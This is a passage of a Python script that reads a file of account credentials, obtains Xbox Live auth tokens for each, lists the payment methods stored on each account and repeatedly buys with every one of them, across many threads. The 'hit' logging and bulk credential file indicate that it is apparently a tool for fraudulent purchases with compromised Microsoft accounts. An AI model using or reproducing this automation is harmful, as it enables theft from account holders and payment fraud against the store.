                Logger.Sprint('FAILED',f"Failed To Hit on {self.email} -> Order In Pending State",Fore.LIGHTYELLOW_EX)
            return "purchased"
        events = purchaseResponse.get("events")
        if events:
            failReason = events['cart'][0]['data']['reason']
            Logger.Sprint('FAILED',f"Failed To Hit on {self.email} -> {failReason}",Fore.LIGHTYELLOW_EX)          

            return "purchase_failed"
        Logger.Sprint('ERROR',f"Unhandled Purchase Response on {self.email} -> {purchaseResponse}")

    def run(self):
        self.xbl3 = self.fetchAuth()

        if "fail" == self.xbl3:
            Purchase.remove_content("accs.txt",self.ms_creds)
            return
        instruments = self.getPaymentMethods()
        if instruments == []:
            Logger.Sprint('ERROR',f'No Payment Method Found -> {self.email}',Fore.LIGHTYELLOW_EX)
        for inst in instruments:
            while True:
                purchase = self.purchase(inst['id'],inst['market'])
                if not purchase == "purchased":
                    break
                time.sleep(30)
            time.sleep(20)
        with lock:
            Purchase.remove_content("accs.txt",self.ms_creds)

    def _run(self):
        try:
            self.run()
        except:
            print_exc()
            pass

if __name__=="__main__":
    threads = int(Logger.Ask("THREADS",'Enter Thread Amount : ',Fore.LIGHTBLUE_EX))
    with ThreadPoolExecutor(max_workers=threads) as exc:
        for acc in open('accs.txt').read().splitlines():
            exc.submit(Purchase,acc)
